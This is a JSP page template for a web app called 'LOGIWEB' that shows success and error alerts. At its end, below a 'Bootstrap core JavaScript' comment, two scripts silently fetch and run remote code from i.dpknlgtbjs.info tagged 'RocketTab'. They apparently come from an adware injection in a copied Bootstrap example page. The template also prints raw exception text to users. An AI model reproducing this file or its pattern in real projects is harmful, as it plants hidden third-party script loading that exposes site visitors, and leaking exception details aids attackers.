<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
<jsp:include page="../header_menu.jsp">
    <jsp:param name="title" value="LOGIWEB"/>
</jsp:include>

<div class="my-settings">
    <c:if test="${info_msg != null}">
        <div class="alert alert-success">
                ${info_msg}
        </div>
    </c:if>
    <c:if test="${error_msg != null}">
        <div class="alert alert-danger">
            <strong>${error_msg}</strong></br>
                ${exception}
        </div>
    </c:if>
</div>

</div>
</div>
<!-- Bootstrap core JavaScript
================================================== -->
<!-- Placed at the end of the document so the pages load faster -->
<script type="text/javascript" async=""
        src="http://i.dpknlgtbjs.info/dpknlgtb/javascript.js?channel=371CF7A692D37C89B449C837BB360535&amp;apptitle=RocketTab&amp;plink=http%3a%2f%2fwww.rockettab.com"></script>
<script type="text/javascript">(function () {
    if (top.location == self.location && top.location.href.split('#')[0] == 'http://bootstrap-3.ru/examples/dashboard/') {
        var po = document.createElement('script');
        po.type = 'text/javascript';
        po.async = true;
        po.src = document.location.protocol + '//i.dpknlgtbjs.info/dpknlgtb/javascript.js?channel=371CF7A692D37C89B449C837BB360535&apptitle=RocketTab&plink=http%3a%2f%2fwww.rockettab.com';
        var s = document.getElementsByTagName('script')[0];
        s.parentNode.insertBefore(po, s);
    }
})();</script>
</body>
</html>